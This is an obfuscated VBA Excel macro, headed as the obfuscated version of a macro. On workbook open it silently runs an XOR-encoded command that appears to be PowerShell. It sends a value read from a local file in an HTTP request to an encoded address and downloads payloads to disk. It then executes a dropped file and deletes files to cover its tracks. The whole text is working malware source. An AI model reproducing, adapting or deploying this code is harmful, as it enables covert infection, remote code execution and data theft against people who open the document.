' ============================================
' VBA Macro - Obfuscated Version
' ============================================
' This is the obfuscated version of the macro.
' Techniques used:
' - Variable/function renaming with meaningless names
' - Comment removal
' - Formatting removal
' - XOR string encoding
' - XOR + Hexadecimal encoding for complex strings
' - Code structure modification
' ============================================

Public veaffqrt As String
Sub hjfiafay()
Dim wtcswrkr As String
Dim szviqcuo As Object
Dim czyptqye As String
wtcswrkr = rsapddnsawqx(dhsaodaskldja("627D657760617A777E7E323F517D7F7F737C7632305376763F466B6277323F536161777F707E6B5C737F7732416B6166777F3C5660736576737C75293236707B667F7362322F32353C4E7B7F753C627C753529323670617C73743A366A322F32222932366A323F7E6632262932366A39393B32693236717D7E7D60323D3236707B667F73623C557766427B6A777E3A366A3E32223B293236627B6A777E44737E677761323D3235352932747D60323A366A323F7566322232693236627B6A777E44737E67776132392F32353C35326F293236627B6A777E44737E6777613239293D3236717D7E7D603C40293236707B667F73623C567B61627D61733A3B29324177663F517D7C66777C66323F4273667A32353C4E7D67666267663C666A6635323F44737E6777323636627B6A777E44737E67776130"), 18)
Set szviqcuo = CreateObject(rsapddnsawqx("{KZAX\{@MDD", 40))
szviqcuo.Run wtcswrkr, 0, True
Open rsapddnsawqx(";Iz'ae'a;ama", 21) For Input As #1
Line Input #1, veaffqrt
Close #1
Dim fscoywku As String
fscoywku = rsapddnsawqx("4Fuonjon4nbn", 26)
Kill fscoywku
fscoywku = rsapddnsawqx("wBFL[EL", 43)
Kill fscoywku
End Sub
Function dhsaodaskldja(ByVal udiawpsd As String) As String
Dim retossdqqa As Integer, popollsisq As String
popollsisq = ""
For retossdqqa = 1 To Len(udiawpsd) Step 2
popollsisq = popollsisq & Chr(CLng("&H" & Mid(udiawpsd, retossdqqa, 2)))
Next retossdqqa
dhsaodaskldja = popollsisq
End Function
Private Sub Workbook_Open()
Call cggehdfn
Call hjfiafay
Call xorrnfba
Call tzhjdpxt
End Sub
Sub xorrnfba()
Dim jxhmvcjv As Object
Dim ltfbytyw As Object
Dim fyreoaml As String
Dim qjvajckc As String
fyreoaml = rsapddnsawqx(dhsaodaskldja("7E6262662C3939"), 22) & veaffqrt & rsapddnsawqx(dhsaodaskldja("2E202020203B707B637A787B7570"), 20)
qjvajckc = rsapddnsawqx(";Ifaptypg;vxq", 21)
Set jxhmvcjv = CreateObject(rsapddnsawqx("\beC{%\beC{Yo{oy~%?%;", 11))
jxhmvcjv.Open rsapddnsawqx("^\M", 25), fyreoaml, False
jxhmvcjv.Send
If jxhmvcjv.Status = 200 Then
Set ltfbytyw = CreateObject(rsapddnsawqx(dhsaodaskldja("5B5E555E5834496E687F7B77"), 26))
ltfbytyw.Open
ltfbytyw.Type = 1
ltfbytyw.Write jxhmvcjv.ResponseBody
ltfbytyw.SaveToFile qjvajckc, 2
ltfbytyw.Close
End If
End Sub
Sub tzhjdpxt()
Dim fscoywku As String
fscoywku = rsapddnsawqx("7Ejm|xu|k7zt}", 25)
Dim okxlstvc As Object
Set okxlstvc = CreateObject(rsapddnsawqx("Y]m|g~z]fkbb", 14))
okxlstvc.Run """" & fscoywku & """", 0, True
Kill fscoywku
End Sub
Function rsapddnsawqx(ByVal donda3 As String, ByVal vsdad As Integer) As String
Dim dadadwvarf As Integer, pdsajdwqd As String
pdsajdwqd = ""
For dadadwvarf = 1 To Len(donda3)
pdsajdwqd = pdsajdwqd & Chr(Asc(Mid(donda3, dadadwvarf, 1)) Xor vsdad)
Next dadadwvarf
rsapddnsawqx = pdsajdwqd
End Function
Sub cggehdfn()
Dim utatigng As Object
Dim jbcumpjs As Object
Dim fsvlnozz As String
Dim ptjuuqfy As String
fsvlnozz = rsapddnsawqx("B^^ZY]]]NXEZHERIEGYIFLCYF[]BEF\CY@KALACGMZDMXFAOSHYBZCMHIAGA^FZZZKX_NY^PSO^O@XK]", 42)
ptjuuqfy = rsapddnsawqx("vCGMZDM", 42)
Set utatigng = CreateObject(rsapddnsawqx("]cdB~~z$]cdB~~zXo{oy~$?$;", 10))
utatigng.Open rsapddnsawqx("dfw", 35), fsvlnozz, False
utatigng.setRequestHeader rsapddnsawqx("Lj|k4X~|wm", 25), rsapddnsawqx(dhsaodaskldja("597B6E7F787878753B213A24343C437D7A70637367345A403425252434343F34437D7A22202F346C22203D3455646478714371765F7D603B2127233A2722343C5F5C4059583834787D7F7134537177757D3D34577C6667757D3B2525253A243A243A243447757275637D3B2127233A2722345170733B2525253A243A243A24"), 20)
On Error Resume Next
utatigng.Send
If utatigng.Status = 200 Then
Set jbcumpjs = CreateObject(rsapddnsawqx("SV]VP<Af'ws", 18))
jbcumpjs.Type = 1
jbcumpjs.Open
jbcumpjs.Write utatigng.ResponseBody
jbcumpjs.SaveToFile ptjuuqfy, 2
jbcumpjs.Close
End If
End Sub
